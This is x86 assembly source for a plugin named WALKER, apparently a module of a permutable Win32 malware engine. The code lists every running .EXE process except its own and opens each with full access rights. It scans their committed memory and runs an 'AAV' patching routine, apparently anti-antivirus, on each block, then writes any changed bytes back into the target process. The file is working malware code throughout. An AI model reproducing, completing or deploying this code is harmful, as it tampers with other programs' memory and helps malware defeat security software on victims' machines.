   ; WALKER
   ; ~~~~~~
   ; - r3 processes memory-blocks scanner

   ; when called, scan all .EXE-processes and all their memory blocks,
   ; for each block performing AAV-patching and updating memory if changed.

   include                 INCLUDE\consts.inc
   include                 k32man.inc
   include                 memory.inc
   include                 aav.inc

   include                 plugin.inc
                           PLUGIN_START    WALKER, W32R3, PERMUTABLE

   handleevent:            hookevent EV_WALKER_RUN, _run
                           stc
                           retn

   _run:                   pusha
                           call    walker_main
                           popa
                           stc
                           retn


   walker_main             proc    pascal
                           local   snaphandle:DWORD
                           local   th_pe:BYTE:size th_pe_struc
                           local   mbi:BYTE:size mbi_struc
                           pusha

                           mov     ecx, WALKER_SIZE
                           eventX  EV_MEMORY_MALLOC
                           mov     edi, edx

                           push    0
                           push    2               ; TH32CS_SNAPPROCESS
                           callQ   CreateToolhelp32Snapshot
                           cmp     eax, -1
                           je      __exit
                           mov     snaphandle, eax

                           mov     th_pe.th_pe_dwSize, size th_pe_struc

                           lea     eax, th_pe
                           push    eax
                           push    snaphandle
                           callQ   Process32First
   __processcycle:         or      eax, eax
                           jz      __processdone

                           lea     edx, th_pe.th_pe_szExeFile
   __scan0:                mov     al, [edx]
                           inc     edx
                           or      al, al
                           jnz     __scan0
                           mov     eax, [edx-5]
                           or      eax, 20202000h
                           neg     eax
                           cmp     eax, -'exe.'
                           jne     __nextprocess

                           callQ   GetCurrentProcessId
                           cmp     eax, th_pe.th_pe_th32ProcessID
                           je      __nextprocess

   ;                       lea     edx, th_pe.th_pe_szExeFile
   ;                       call    dump_asciiz_edx
   ;                       call    dump_crlf

                           push    th_pe.th_pe_th32ProcessID ; process id
                           push    0
                           push    001F0FFFh       ; PROCESS_ALL_ACCESS
                           callQ   OpenProcess
                           cmp     eax, -1
                           je      __nextprocess
                           xchg    ebx, eax        ; process handle

   ;----------------------------------------------------------------------------
                           mov     esi, 00400000h  ; start address

   __querycycle:           lea     eax, mbi
                           push    size mbi_struc
                           push    eax
                           push    esi             ; address
                           push    ebx             ; process handle
                           callQ   VirtualQueryEx
                           cmp     eax, size mbi_struc
                           jne     __querydone

                           mov     eax, mbi.mbi_State
                           cmp     eax, 1000h      ; MEM_COMMIT
                           jne     __nextregion

                           mov     ecx, mbi.mbi_RegionSize
                           call    walker_fuxor

   __nextregion:           add     esi, mbi.mbi_RegionSize
                           cmp     esi, 80000000h  ; end address
                           jb      __querycycle
   __querydone:
   ;----------------------------------------------------------------------------

                           push    ebx             ; process handle
                           callQ   CloseHandle

   __nextprocess:          lea     eax, th_pe
                           push    eax
                           push    snaphandle
                           callQ   Process32Next
                           jmp     __processcycle

   __processdone:          push    snaphandle
                           callQ   CloseHandle

   __exit:                 mov     edx, edi
                           eventX  EV_MEMORY_MFREE

                           popa
                           ret
                           endp

   ; action: split big block (size in ECX) into small blocks (calls)
   ; input: EBX=process handle
   ;        ESI=memory block address
   ;        ECX=memory block size
   ;        EDI=temp block

   walker_fuxor:           pusha

                           mov     eax, ecx

   __cycle:                mov     ecx, WALKER_SIZE
                           cmp     ecx, eax
                           jbe     __be
                           mov     ecx, eax
   __be:
                           call    walker_fuxor_real

                           add     esi, ecx
                           sub     eax, ecx
                           jnz     __cycle

                           popa
                           retn

   ; input: EBX=process handle
   ;        ESI=memory block address
   ;        ECX=memory block size
   ;        EDI=temp block

   walker_fuxor_real:      pusha

                           call    mem_read
                           jc      __exit

                           xchg    esi, edi
                           eventX  EV_AAV_BUF      ; using: ESI,ECX
                           xchg    esi, edi

                           or      eax, eax        ; no bytes changed?
                           jz      __exit

                           call    mem_write       ; update patched buffer

   __exit:                 popa
                           retn

   mem_read:               pusha
                           push    0
                           push    esp             ; @bytesread
                           push    ecx             ; bytes to read
                           push    edi             ; write to
                           push    esi             ; address (read from)
                           push    ebx             ; process handle
                           callQ   ReadProcessMemory
                           pop     ecx
                           or      eax, eax
                           jz      __bad
                           cmp     ecx, [esp+6*4]  ; pusha.ecx
                           jne     __bad
                           popa
                           clc
                           retn
   __bad:                  popa
                           stc
                           retn

   mem_write:              pusha
                           push    0               ; @byteswritten
                           push    ecx             ; bytes to write
                           push    edi             ; read from
                           push    esi             ; address (write to)
                           push    ebx             ; process handle
                           callQ   WriteProcessMemory
                           popa
                           retn

                           PLUGIN_END
